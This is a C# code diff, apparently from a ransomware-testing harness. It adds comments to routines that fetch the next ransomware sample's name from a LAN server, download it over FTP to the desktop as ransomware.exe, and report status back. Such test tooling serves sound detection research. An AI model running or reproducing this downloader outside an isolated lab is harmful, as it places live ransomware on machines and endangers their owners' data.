@@ -16,6 +16,7 @@ namespace BaseLineRansomwareDownloader
         static string RANSOMWAREFILEPATH = "";
         private static readonly HttpClient client = new HttpClient();
 
+        //Gets name of next ransomware
         public static void getBaseRansomware()
         {
 
@@ -25,6 +26,7 @@ namespace BaseLineRansomwareDownloader
 
         }
 
+        //Parses the string from the server to the raw ransomware name
         private static string findNAMEONTEST(string responsestring)
         {
             int i = 0;
@@ -45,6 +47,7 @@ namespace BaseLineRansomwareDownloader
             return "what?";
         }
 
+        //Downloads the ransomware from the server
         public static void downloadFileFTP()
         {
             string ransomwareName = NAMEONTEST;
@@ -67,6 +70,7 @@ namespace BaseLineRansomwareDownloader
             }
         }
 
+        //Informs the server that the data has been downloaded, thus creating an empty 
         public static async void postBaseFetched()
         {
             var values = new Dictionary<string, string>
@@ -76,11 +80,12 @@ namespace BaseLineRansomwareDownloader
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = await client.PostAsync("http://192.168.8.102/v1/index.php/postbasefetched", content);
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postbasefetched", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
 
+        //Post to the server in the quicktester that the ransomware has been taken
         public static async void postBaseTaken()
         {
             var values = new Dictionary<string, string>
@@ -90,7 +95,7 @@ namespace BaseLineRansomwareDownloader
 
             var content = new FormUrlEncodedContent(values);
 
-            var response = await client.PostAsync("http://192.168.8.102/v1/index.php/postbasetaken", content);
+            var response = client.PostAsync("http://192.168.8.102/v1/index.php/postbasetaken", content).Result;
 
             var responseString = await response.Content.ReadAsByteArrayAsync();
         }
@@ -101,6 +106,7 @@ namespace BaseLineRansomwareDownloader
             return NAMEONTEST;
         }
 
+        //Sets the path for the downloaded ransomware, this is the desktop.
         public static void setRansomwareFilePath()
         {
             RANSOMWAREFILEPATH = Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\ransomware.exe";
